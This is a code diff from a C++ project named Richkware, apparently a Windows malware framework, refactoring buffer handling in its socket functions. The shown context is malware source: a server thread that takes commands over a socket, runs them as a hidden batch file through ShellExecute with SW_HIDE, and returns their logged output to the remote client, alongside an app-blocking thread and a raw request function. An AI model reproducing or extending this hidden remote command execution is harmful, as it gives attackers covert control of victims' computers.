@@ -133,7 +133,7 @@ BlockAppsThread(void* arg) {
 
 }
 
-int Richkware::StartServer(const char* port, int bufferlength) {
+int Richkware::StartServer(const char* port) {
 	WSADATA wsaData;
 	int iResult;
 
@@ -221,7 +221,7 @@ int Richkware::StartServer(const char* port, int bufferlength) {
 }
 
 DWORD WINAPI ClientSocketThread(void* CS) {
-	int bufferlength = 512;
+	const int bufferlength = 512;
 	SOCKET ClientSocket = (SOCKET) CS;
 
 	int iResult;
@@ -264,18 +264,18 @@ DWORD WINAPI ClientSocketThread(void* CS) {
 			if (ShellExecute(0, "open", fileBat.c_str(), "", 0, SW_HIDE)) {
 				// Response
 				command.append("  -->  ");
-				std::ifstream file(fileLog.c_str());
+				std::ifstream fileResp(fileLog.c_str());
 				std::string s;
-				if (file.is_open()) {
-					while (!file.eof()) {
-						getline(file, s);
+				if (fileResp.is_open()) {
+					while (!fileResp.eof()) {
+						getline(fileResp, s);
 						command.push_back('\n');
 						command.append(s);
 					}
 				}
 				iSendResult = send(ClientSocket, command.c_str(),
 						(int) strlen(command.c_str()), 0);
-				file.close();
+				fileResp.close();
 
 			} else {
 				iSendResult = send(ClientSocket, "error", 5, 0);
@@ -306,14 +306,14 @@ DWORD WINAPI ClientSocketThread(void* CS) {
 }
 
 const char* Richkware::RawRequest(const char* serverAddress, const char* port,
-		const char* request, int bufferlength) {
+		const char* request) {
 	WSADATA wsaData;
 	SOCKET ConnectSocket = INVALID_SOCKET;
 	struct addrinfo *result = NULL, *ptr = NULL, hints;
 	const char* sendbuf = request;
+	const int bufferlength = 512;
 	char recvbuf[bufferlength];
 	int iResult;
-	int recvbuflen = bufferlength;
 	std::string response;
 
 	// Initialize Winsock
@@ -372,10 +372,9 @@ const char* Richkware::RawRequest(const char* serverAddress, const char* port,
 	// Receive until the peer closes the connection
 	do {
 
-		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
+		iResult = recv(ConnectSocket, recvbuf, bufferlength, 0);
 		if (iResult > 0) {
 			// answer
-			std::cout << recvbuf;
 			response.append(recvbuf);
 
 		} else if (iResult == 0) {
